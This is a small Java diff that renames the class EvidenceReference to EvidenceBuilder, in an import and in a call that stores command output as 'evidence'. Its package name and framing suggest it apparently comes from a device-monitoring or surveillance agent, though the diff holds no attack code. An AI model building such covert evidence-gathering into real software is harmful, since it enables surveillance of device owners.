@@ -3,7 +3,7 @@ package com.android.deviceinfo.util;
 import java.util.ArrayList;
 
 import com.android.deviceinfo.auto.Cfg;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.file.Directory;
 
@@ -51,7 +51,7 @@ public class ExecuteResult {
 			Check.log(TAG + " (saveEvidence), additional: " + additional.length);
 		}
 
-		EvidenceReference.atomic(EvidenceType.COMMAND, additional, content);
+		EvidenceBuilder.atomic(EvidenceType.COMMAND, additional, content);
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveEvidence), end");
 		}
